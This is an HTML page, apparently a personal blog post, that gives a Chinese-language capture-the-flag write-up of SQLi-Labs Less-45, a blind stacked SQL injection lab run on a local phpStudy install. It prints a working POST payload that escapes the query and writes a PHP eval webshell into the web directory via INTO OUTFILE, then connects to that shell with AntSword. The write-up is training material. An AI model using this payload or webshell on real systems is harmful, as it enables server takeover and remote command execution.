@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-45 带括号的盲堆叠注入 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-45 带括号的盲堆叠注入 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.28 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, 堆叠注入, 盲注, POST注入, WebShell</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-45 (POST - Stacked Query Injection - Blind based - String)</li>
+        <li><strong>提示：</strong>POST 登录框，密码字段无转义，闭合符为 <code>')</code>，支持堆叠执行，无报错回显。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p>本关卡是 Less-44 的变种。后端依然使用 <code>mysqli_multi_query()</code> 并屏蔽了报错，环境为纯盲注。区别在于闭合上下文变为 <code>password=('$password')</code>。</p>
+    <p><strong>攻击策略：</strong>无需测试 <code>INSERT</code> 回显，直接在密码字段利用 <code>')</code> 闭合，堆叠 <code>INTO OUTFILE</code> 语句盲写 WebShell，去本地物理目录验证文件是否落地。</p>
+
+    <h2>3. 工具配置与操作步骤</h2>
+    
+    <h3>工具配置：Burp Suite 与中国蚁剑</h3>
+    <ul>
+        <li><strong>Burp Suite</strong>：拦截 POST 请求，修改请求体。</li>
+        <li><strong>中国蚁剑</strong>：新建连接，URL 为 <code>http://localhost/sqli-labs-master/Less-45/shell.php</code>，密码为 <code>cmd</code>。</li>
+    </ul>
+
+    <h3>操作步骤与解析：</h3>
+    
+    <p><strong>第一步：盲写 WebShell</strong></p>
+    <p><strong>请求体 Payload：</strong></p>
+    <pre><code>login_user=admin&login_password=1'); select '<?php @eval($_POST["cmd"]); ?>' into outfile 'D:/phpstudy_pro/WWW/sqli-labs-master/Less-45/shell.php'-- -&mysubmit=Login</code></pre>
+    <p><strong>回显现象：</strong>页面重定向至 <code>BUG OFF YOU SILLY DUMB HACKER</code>。忽略前端页面，直接前往本地路径 <code>D:\phpstudy_pro\WWW\sqli-labs-master\Less-45\</code> 确认 <code>shell.php</code> 是否生成。</p>
+
+    <p><strong>第二步：蚁剑连接</strong></p>
+    <p>确认文件落地后，使用蚁剑建立连接。连接配置与 Less-38 一致（URL 完整、密码小写、类型 PHP），成功连接后进入文件管理界面。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>闭合符识别：</strong>L44 是单引号，L45 带括号，Paylaod 结构的微小差别决定了 SQL 语法是否能成功闭合。</li>
+        <li><strong>盲环境验证：</strong>对于盲注，页面不会有任何回显。验证攻击是否成功的唯一标准是检查服务器物理文件系统是否发生变化。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>盲堆叠注入</strong>：在无法获取任何数据库或报错信息的条件下，直接利用堆叠漏洞写文件。</li>
+        <li><strong>WebShell 写入与利用</strong>：通过 SQL 注入向 Web 目录写木马，是实现从数据库层突破到系统文件层控制的核心手段。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
